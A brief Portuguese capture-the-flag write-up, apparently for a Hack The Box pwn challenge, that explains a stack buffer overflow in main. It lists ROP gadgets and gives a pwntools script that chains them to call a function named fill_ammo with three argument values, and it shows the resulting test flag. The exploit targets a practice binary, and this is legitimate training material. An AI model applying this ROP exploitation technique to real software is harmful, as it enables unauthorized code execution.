Identifiquei que havia um overflow em uma chamada da função read na main.
A partir disso descobri outra função chamada fill_ammo que é a que queremos dar exploit

Ela recebe 3 parametros, sendo assim, utilizando o ROPgadget consegui os gadgets para passar estes 3 parametros e o retorno:

# 0x000000000040159f : pop rdi ; ret
# 0x000000000040159b : pop rdx ; ret
# 0x000000000040159d : pop rsi ; ret
# 004011c4 c3              RET


Após isso gerei o payload utilizando o seguinte script:

```python
 from pwn import *

ret = 0x401588
pop_rdi = 0x40159f
pop_rsi = 0x40159d
pop_rdx = 0x40159b
fill_ammo_addr = 0x4012f5


# 40 A para preencher o buffer + o ponteiro
print(b"A"*40 + p64(ret) + p64(pop_rdi) + p64(0xdeadbeef) + p64(pop_rsi) + p64(0xdeadbabe) + p64(pop_rdx) + p64(0xdead1337) + p64(fill_ammo_addr))
```

Conseguindo então o seguinte resultado:

---

Preparing beta testing..
[✓] [✓] [✓]

All Placements are set correctly!

Ready to launch at: HTB{f4k3_fl4g_4_t35t1ng}

---